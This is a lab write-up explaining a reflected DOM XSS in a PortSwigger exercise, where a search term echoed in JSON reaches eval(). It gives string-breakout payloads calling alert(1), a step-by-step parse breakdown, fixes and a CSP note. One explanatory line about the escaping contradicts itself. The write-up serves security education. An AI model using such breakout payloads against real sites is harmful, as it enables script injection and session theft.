# Lab: Reflected DOM XSS

**Category:** Cross-Site Scripting (XSS)\
**Difficulty:** Practitioner\
**Objective:** Create an injection that calls the `alert()` function via a reflected DOM vulnerability.

## 0. Attacker mindset

Reflected DOM vulnerabilities are different from traditional reflected XSS. The server-side application processes data from a request and echoes it in the response, but the dangerous part happens in client-side JavaScript. A script on the page reads the reflected data and passes it to an unsafe sink like `eval()`. The attacker needs to understand both the server's encoding behavior AND the client's JavaScript flow.

## 1. What is the vulnerability?

The search functionality reflects user input in a JSON response, which is then passed to `eval()` in client-side JavaScript.

### The HTML Page

When you search for something, the page loads:

```html
<script src='/resources/js/searchResults.js'></script>
<script>search('search-results')</script>
```

### The Vulnerable JavaScript (`searchResults.js`)

```javascript
...
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();
}
...
```

### The JSON Response

When you search for a term, the server returns:

```json
{
    "results": [],
    "searchTerm": "USER_INPUT"
}
```

**The flow:**
1. User controls `window.location.search` (e.g., `?search=XSS`)
2. The `search()` function makes a request to `/search-results?search=XSS`
3. Server returns JSON with the search term reflected in `searchTerm`
4. `eval('var searchResultsObj = ' + this.responseText)` executes the JSON as code
5. The injected JSON string is parsed and executed

## 2. How did I exploit it?

### Discovery

First, inspected the page source and found the two scripts loading `searchResults.js` and calling `search('search-results')`. This indicated that search results are rendered dynamically via JavaScript, not directly in the initial HTML.

### Code Analysis

Loaded `/resources/js/searchResults.js` and found the `eval()` call. This is the dangerous sink.

Then made a test search for `'` (a single quote) and examined the JSON response:

```json
{"results":[],"searchTerm":"'"}
```

The quote was preserved. Tested with `"` (double quote):

```json
{"results":[],"searchTerm":"\""}
```

**Observation:** The server escapes double quotes (`"` → `\"`) but **does not escape backslashes (`\`)**.

### The Breakthrough

Because backslashes aren't escaped, we can use them to manipulate how the JSON string is parsed. The goal is to break out of the JSON string and inject JavaScript that `eval()` will execute.

**Final payload:**
```
\"}; alert(1); //
```

### Why It Works - Step by Step

#### Step 1: What the server receives
```
search = \"}; alert(1); //
```

#### Step 2: What the server returns (JSON response)
The server constructs a JSON string. Since it escapes `"` but not `\`, the input `\"` becomes `\\"` in the JSON (the backslash is escaped to `\\`, and the quote becomes `\"`):

```json
{"results":[],"searchTerm":"\\"}; alert(1); //"}
```

#### Step 3: What `eval()` receives
The `eval()` executes:
```javascript
var searchResultsObj = {"results":[],"searchTerm":"\\"}; alert(1); //"}
```

#### Step 4: How JavaScript parses this

Let's break down the string that `eval()` sees:

| Part | What it does |
|------|---------------|
| `var searchResultsObj = ` | Variable assignment |
| `{"results":[],"searchTerm":"\\"` | Object literal - `\\` becomes a single literal backslash |
| `"` | **Closes the string!** (The backslash before it was just a literal backslash, not an escape) |
| `};` | Closes the object AND ends the `var` statement |
| `alert(1);` | **Executes!** This is now a separate statement |
| `//"}` | Comments out the rest (the original closing quote and brace from the JSON) |

### Alternative Payload (PortSwigger Solution)

```
\"-alert(1)}//
```

This uses the subtraction operator to separate expressions instead of a semicolon.

### Why the subtraction operator works:

```javascript
var searchResultsObj = {"results":[],"searchTerm":"\\"-alert(1)}//"}
```

- `"\\"` is a string containing one backslash
- `-` subtracts the result of `alert(1)` (which returns `undefined`) from something
- `undefined` coerces to `NaN`, but the alert already fired
- The `}` closes the object early
- `//` comments out the rest

## 3. Impact

- Arbitrary JavaScript execution via `eval()` sink
- The payload executes immediately when the page loads (no user interaction)
- Bypasses the server's double-quote escaping by exploiting unescaped backslashes
- Can lead to session hijacking, credential theft, or account takeover

## 4. How can it be fixed?

### The Real Problem

The vulnerability exists because:
1. **`eval()` is used** with user-controlled data - NEVER do this
2. **Server escaping is incomplete** - escaping `"` but not `\` creates a bypass opportunity

### Fixes

#### 1. Never use `eval()` with user input
```javascript
// DON'T
eval('var searchResultsObj = ' + responseText);

// DO - use JSON.parse() instead
var searchResultsObj = JSON.parse(responseText);
```

#### 2. If you must embed user data in JSON, use a proper JSON encoder
```javascript
// The server should properly escape all JSON special characters:
// " → \"
// \ → \\
// / → \/
// etc.
```

#### 3. Use Content Security Policy (CSP) to block `eval()`
```
Content-Security-Policy: script-src 'self' 'unsafe-inline'
```
Note: `'unsafe-eval'` is required for `eval()` - omit it to block eval entirely.

---

## Key Insight: Reflected DOM vs Traditional Reflected XSS

| Aspect | Traditional Reflected XSS | Reflected DOM XSS |
|-|-|-|
| Server reflects payload | ✅ Yes | ✅ Yes |
| Payload appears in HTML | ✅ Yes | ❌ No (in JSON) |
| Browser executes via | HTML parser | JavaScript sink (`eval()`) |
| Can bypass WAF? | Sometimes | Yes (payload never in HTML) |
| Fix requires | Server-side encoding | Server-side encoding + client-side safe APIs |

---

## The Escaping Bypass Pattern

This lab demonstrates a common pattern:

1. **Server escapes `"` to `\"`** (good intention)
2. **Server does NOT escape `\`** (flaw)
3. **Attacker sends `\"`** → server generates `\\"` in JSON
4. **Result:** The `\\` becomes a literal backslash, the `"` becomes unescaped and closes the string

| Input | Server escaping | Result in JSON | Effect |
|-|-|-|-|
| `"` | `\"` | `\"` | Safe - quote escaped |
| `\` | (none) | `\` | Safe - backslash literal |
| `\"` | `\\"` | `\\"` | **Dangerous** - backslash literal + unescaped quote |

---

**MITRE ATT&CK:** [T1189 - Drive-by Compromise](https://attack.mitre.org/techniques/T1189/)